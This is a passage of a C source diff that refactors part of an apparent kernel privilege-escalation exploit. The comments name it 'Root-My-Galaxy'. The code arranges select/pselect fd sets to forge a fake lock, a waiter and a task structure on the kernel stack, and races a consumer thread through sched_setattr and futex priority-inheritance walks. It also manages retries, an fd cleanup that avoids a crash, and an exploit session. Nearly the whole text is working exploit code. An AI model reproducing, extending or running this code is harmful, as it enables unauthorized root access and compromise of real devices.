       .tv_usec = timeout_us % 1000000,
     };
-    ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
+    context->select_result = select(
+        PSELECT_ROUTE_NFDS, &context->input_set, &context->output_set,
+        &context->exception_set, &timeout);
   }
-  int saved_errno = errno;
-  restore_standard_io();
-  pr_info("pselect post-select compact=%d +%.0fms ret=%d\n", compact_route,
-          fops_elapsed_ms(&route_t0), ret);
-  atomic_store(&legacy_consumer_go, 0);
+  context->select_errno = errno;
+  restore_standard_io(context->stdio_backup);
+  pr_info("pselect post-select compact=%d +%.0fms ret=%d\n",
+          context->layout.compact_waiter, fops_elapsed_ms(&route_t0),
+          context->select_result);
+  atomic_store(&context->race->consumer_go, 0);
 
-  /* Root-My-Galaxy slide_pselect_stack_copy: when the consumer entered sched_setattr,
-   * wait for it to finish before tearing the fds down. The PI walk runs on
-   * the consumer's CPU and we must not close/reclaim the block fds while it
-   * still holds the crafted waiter on the stack. */
-  int consumer_stuck = 0;
-  if (atomic_load(&legacy_consumer_inflight) != 0) {
-    for (int i = 0; i < 2000 && atomic_load(&legacy_consumer_inflight) != 0; i++) {
+  context->calls = atomic_load(&context->race->consumer_calls);
+  context->successes = atomic_load(&context->race->consumer_success);
+  if (context->calls > 0 && context->successes > 0) {
+    context->status.code = ROUTE_OK;
+    context->status.step = 0;
+    context->status.error_number = 0;
+    route_last_step = 0;
+    route_last_errno = 0;
+  } else {
+    select_stack_fail(context, 33, context->select_errno);
+  }
+  return context->status;
+}
+
+static void select_stack_disarm(SelectStackRouteContext *context) {
+  atomic_store(&context->race->consumer_go, 0);
+  if (atomic_load(&context->race->consumer_inflight) != 0) {
+    for (int i = 0;
+         i < 2000 && atomic_load(&context->race->consumer_inflight) != 0;
+         i++) {
       usleep(1000);
     }
-    consumer_stuck = atomic_load(&legacy_consumer_inflight) != 0;
+    context->consumer_stuck =
+        atomic_load(&context->race->consumer_inflight) != 0;
   }
+  context->status.kernel_disarmed = !context->consumer_stuck;
+}
 
-  calls = atomic_load(&legacy_consumer_calls);
-  success = atomic_load(&legacy_consumer_success);
-  pr_info("pselect returned ret=%d errno=%d calls=%d success=%d delay=%d\n",
-          ret, saved_errno, calls, success, delay_usec);
-
-    fd_set in;
-    fd_set out;
-    fd_set ex;
-    prepare_pselect_fdsets(&in, &out, &ex);
-    pr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
-            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
-            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
-            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
-            attempt, attempts, pselect_waiter_shift(),
-            page_base, fake_lock, fake_w0, fake_task,
-            (unsigned long long)fdset_get_word(&in, 0),
-            (unsigned long long)fdset_get_word(&in, 3),
-            (unsigned long long)fdset_get_word(&out, 0),
-            (unsigned long long)fdset_get_word(&ex, 0),
-            (unsigned long long)fdset_get_word(&ex, 1),
-            (unsigned long long)fdset_get_word(&ex, 2),
-            (unsigned long long)fdset_get_word(&ex, 3));
-    log_sync();
-
-    /* The route may replace low fds, including stdout and stderr. */
-    reserve_standard_io();
-    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
-    close(high_read);
-
-    atomic_store(&consumer_calls, 0);
-    atomic_store(&consumer_success, 0);
-    atomic_store(&punch_consume_stop, 0);
-    int delay_usec = route_delay_usec(attempt);
-    atomic_store(&main_route_delay_usec, delay_usec);
-    atomic_store(&punch_consume_go, attempt);
-
-    pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
-            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0));
-    errno = 0;
-    int ret;
-    if (compact_route) {
-      struct timespec ts = {
-        .tv_sec = compact_timeout_sec,
-        .tv_nsec = compact_timeout_usec * 1000,
-      };
-      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
-    } else {
-      /* non-compact stays on select with its 200ms timeout */
-      struct timeval timeout = {
-        .tv_sec = PSELECT_TIMEOUT_SEC,
-#ifdef PSELECT_TIMEOUT_USEC
-        .tv_usec = PSELECT_TIMEOUT_USEC,
-#else
-        .tv_usec = 0,
-#endif
-      };
-      ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
-    }
-    int saved_errno = errno;
-    restore_standard_io();
-    pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
-            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0), ret);
-    atomic_store(&punch_consume_go, 0);
-
-    /* RMGP pattern, wait out the consumer before closing the fds. The PI walk
-     * runs on its CPU with the crafted waiter on the stack */
-    int consumer_stuck = 0;
-    if (atomic_load(&consumer_inflight) != 0) {
-      for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
-        usleep(1000);
+static void select_stack_destroy(SelectStackRouteContext *context) {
+  restore_standard_io(context->stdio_backup);
+  if (context->consumer_stuck) {
+    select_stack_fail(context, 34, context->select_errno);
+    context->status.code = ROUTE_DIRTY_FAILURE;
+    pr_error("pselect consumer still inflight; leaking route fds\n");
+    return;
+  }
+  if (context->selected_fds_installed) {
+    for (int fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
+      if (FD_ISSET(fd, &context->owned_input_set) ||
+          FD_ISSET(fd, &context->owned_output_set) ||
+          FD_ISSET(fd, &context->owned_exception_set)) {
+        close(fd);
+        if (context->block_fd == fd) context->block_fd = -1;
+        if (context->pipe_fd[0] == fd) context->pipe_fd[0] = -1;
+        if (context->pipe_fd[1] == fd) context->pipe_fd[1] = -1;
       }
-      consumer_stuck = atomic_load(&consumer_inflight) != 0;
     }
-
-    calls = atomic_load(&consumer_calls);
-    success = atomic_load(&consumer_success);
-    pr_info("pselect returned attempt=%d/%d ret=%d errno=%d calls=%d "
-            "success=%d delay=%d\n",
-            attempt, attempts, ret, saved_errno, calls, success, delay_usec);
-
-    if (calls > 0 && success > 0) {
-      route_last_step = 0;
-      route_last_errno = 0;
-      winner = 1;
-    } else {
-      route_last_step = 33;
-      route_last_errno = saved_errno;
-    }
-
-    /* open_selected_fds only closes its own F_DUPFD copy */
-    if (consumer_stuck) {
-      /* stuck in sched_setattr or futex, closing would reclaim objects its
-       * syscall still uses, leak and let process exit reclaim them */
-      route_last_step = 34;
-      pr_warning("pselect consumer still inflight, leaking route fds\n");
-      leak_fds = 1;
-      break;
-    }
-    if (block_fd != pipefd[0]) {
-      close(block_fd);
-    }
-
-    if (winner) {
-      break;
-    }
+    context->selected_fds_installed = 0;
   }
-
-  if (!leak_fds) {
-    close(pipefd[0]);
-    close(pipefd[1]);
+  if (context->high_read_fd >= 0) close(context->high_read_fd);
+  if (context->block_fd >= 0 && context->block_fd != context->pipe_fd[0]) {
+    close(context->block_fd);
   }
+  if (context->pipe_fd[0] >= 0) close(context->pipe_fd[0]);
+  if (context->pipe_fd[1] >= 0) close(context->pipe_fd[1]);
+  context->high_read_fd = context->block_fd = -1;
+  context->pipe_fd[0] = context->pipe_fd[1] = -1;
+  context->status.userspace_clean = 1;
+  if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
+    context->status.code = ROUTE_FALLBACK_SAFE;
+  }
+}
 
-  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
-          calls, success, route_last_step, route_last_errno);
+void do_pselect_fake_lock_route(const WriteRequest *request) {
+  /* TODO(decoupling:S14-select-retry-controller): Compact outer retries must
+   * rebuild both HeapContext payload ownership and PiRaceContext sequencing.
+   * Keep this route invocation single-shot until ExploitSession can create a
+   * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
+  SelectStackRouteContext context;
+  select_stack_route_context_init(
+      &context, &g_pi_race_context, request, execution_settings(),
+      target_profile_select_stack_layout(&g_target_profile),
+      standard_io_backup);
+  route_last_step = route_last_errno = 0;
+
+  if (select_stack_prepare(&context) == 0) {
+    select_stack_execute(&context);
+  }
+  select_stack_disarm(&context);
+  select_stack_destroy(&context);
+
+  pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
+          "step=%d errno=%d\n", context.calls, context.successes,
+          context.status.code, context.status.userspace_clean,
+          context.status.kernel_disarmed, context.status.step,
+          context.status.error_number);
 }
